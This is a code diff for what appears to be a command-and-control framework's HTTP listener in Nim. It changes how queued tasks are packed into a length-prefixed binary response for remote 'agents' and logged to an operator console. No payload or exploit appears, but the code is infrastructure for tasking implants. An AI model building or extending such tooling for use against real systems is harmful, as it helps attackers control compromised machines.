@@ -1,9 +1,14 @@
-import prologue, json
-import sequtils, strutils, times
+import prologue, json, terminal, strformat
+import sequtils, strutils, times, base64
 
 import ./handlers
-import ../utils
+import ../[utils, globals]
 import ../../common/types
+
+proc encode(bytes: seq[seq[byte]]): string = 
+    result = ""
+    for task in bytes: 
+        result &= encode(task)
 
 proc error404*(ctx: Context) {.async.} = 
     resp "", Http404
@@ -88,11 +93,33 @@ proc getTasks*(ctx: Context) {.async.} =
         agent = ctx.getPathParams("agent")
         
     try: 
+        var response: seq[byte]
         let tasks = getTasks(listener, agent)
-        resp $tasks
+
+        if tasks.len <= 0: 
+            resp "", Http200
+            return
+
+        # Create response, containing number of tasks, as well as length and content of each task
+        # This makes it easier for the agent to parse the tasks
+        response.add(uint8(tasks.len))
+
+        for task in tasks:
+            response.add(uint32(task.len).toBytes()) 
+            response.add(task)
+        
+        await ctx.respond(
+            code = Http200,
+            body = response.toString()
+        )
+
+        # Notify operator that agent collected tasks
+        {.cast(gcsafe).}:
+            let date = now().format("dd-MM-yyyy HH:mm:ss")
+            cq.writeLine(fgBlack, styleBright, fmt"[{date}] [*] ", resetStyle, fmt"{$response.len} bytes sent.")
+
     except CatchableError:
         resp "", Http404
-
 
 #[
     POST /{listener-uuid}/{agent-uuid}/{task-uuid}/results
